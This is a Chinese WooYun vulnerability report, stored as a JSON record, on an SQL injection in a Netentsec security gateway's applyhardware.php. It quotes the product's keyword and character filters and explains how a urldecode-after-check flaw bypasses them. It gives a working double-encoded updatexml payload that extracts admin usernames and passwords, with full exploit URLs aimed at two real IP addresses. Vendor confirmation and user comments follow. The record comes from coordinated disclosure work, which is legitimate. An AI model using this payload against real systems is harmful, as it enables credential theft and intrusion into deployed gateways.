{"id": 48109, "wybug_id": "wooyun-2014-077689", "wybug_title": "网康安全网关SQL注入(绕过全局防注入)", "wybug_corp": "网康科技", "wybug_author": "secmap", "wybug_date": "2014-10-08 09:56", "wybug_open_date": "2015-01-06 09:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-06：\t细节向公众公开  简要描述： 网康科技经过上一次的洗礼过后,整体的安全性有了很大的提高，(拍掌...)其全局过滤函数非常变态，研究过后，最终还是发现了一处注入,绕过了变态的全局防注入。 详细说明：  0x01 先来看看全局过滤函数\n//防注入函数function inject_check($sql_str){\treturn preg_match( \"/(select|insert|update|delete|drop|'|\\/\\*|\\*|\\.\\.\\/|\\.\\/|UNION|into|load_file|outfile)/i\", $sql_str );}\n更变态的还有\nfunction str_check($str){\tif(strstr($str, ' '))\t\treturn false;\tif(strstr($str, \"'\"))\t\treturn false;\tif(strstr($str, '\"'))\t\treturn false;\tif(strstr($str, '/'))\t\treturn false;\tif(strstr($str, '&'))\t\treturn false;\tif(strstr($str, ';'))\t\treturn false;\tif(strstr($str, '%'))\t\treturn false;\treturn true;}\n当检测到有这些符号、字符 直接调用exit()推出，有点变态。0x02 下面来说这个注入是怎样产生的漏洞的文件为/WebPages/applyhardware.php部分代码\ninclude(\"include/common.inc\");session_start();$para = $_SESSION['parastr'];if(!str_check($action))\t$action = \"\";switch ($action){case \"\":\tredirect(\"/vpnweb/index.php?para=$para\");\tbreak;case \"applyhardware\":\t$dbh = db_connect();\t$hard_user = urldecode($hard_user);\t$hard_pass = urldecode($hard_pass);\tif(!str_check($hard_user))\t$hard_user = \"\";\tif(!str_check($hard_pass))\t$hard_pass = \"\";\t$query = \"select UserId from ISCUserTable where UserName='$hard_user' and Password='$hard_pass'\";\n其中 $hard_user 和 $hard_pass 两个参数，经过了str_check的检查，但两个参数均是通过urldecode解码后得到的 ，加上最后进入SQL查询的语句为：select UserId from ISCUserTable where UserName='$hard_user' and Password='$hard_pass'于是最终想到了结合两个参数，实现注入0x03 对该注入的利用通过对str_check函数的分析，我们提交的参数不能含有空格、单引号、双引号、斜线、分号等，最后通过无数次的测试，有了最终的利用代码：hard_user=%255C&hard_pass=%0a%0dand%0a%0d1=(updatexml(1,concat(0x5e24,(select%0a%0dconcat(adminname,0x7e,passwd)%0a%0dfrom%0a%0dAdmin%0a%0dlimit%0a%0d1),0x5e24),1))%25230x04 漏洞证明https://60.216.87.203//WebPages/applyhardware.php?action=applyhardware&hard_user=%255C&hard_pass=%0a%0dand%0a%0d1=(updatexml(1,concat(0x5e24,(select%0a%0dconcat(adminname,0x7e,passwd)%0a%0dfrom%0a%0dAdmin%0a%0dlimit%0a%0d1),0x5e24),1))%2523\n\nhttps://115.24.177.57/WebPages/applyhardware.php?action=applyhardware&hard_user=%255C&hard_pass=%0a%0dand%0a%0d1=(updatexml(1,concat(0x5e24,(select%0a%0dconcat(adminname,0x7e,passwd)%0a%0dfrom%0a%0dAdmin%0a%0dlimit%0a%0d1),0x5e24),1))%2523\n\n   漏洞证明：  \n\n   修复方案：  inject_check()函数过滤   版权声明：转载请注明来源 secmap@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：19  确认时间：2014-10-08 10:08 厂商回复： 感谢大家的支持，大家的支持是我们进步的动力。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-29 13:08 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  鼓掌    \n     2014-09-29 13:16 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  有渠道接触源码就是吊阿    \n     2014-09-29 15:32 |    \t\t爱Gail \t\t\t( 普通白帽子  |\t\t\t        Rank:237 漏洞数:38        | 爱漏洞、爱编程、爱旅游、爱Gail)\t\t \n  强    \n     2014-10-08 10:01 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  ...    \n     2014-10-08 10:23 |    \t\t氓氓童鞋 \t\t\t( 普通白帽子  |\t\t\t        Rank:374 漏洞数:65        )\t\t \n  @xsser 额。。。数据是不是回滚了。。。怎么赶脚前一阵子就已经提交过这个洞洞了。。。    \n     2014-10-29 11:09 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  很给力啊    \n     2015-02-16 21:09 |    \t\tToySweet \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:8        | 做有道德的安全研究员。)\t\t \n  @xsser 哎呦    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 19, "Ranks": null}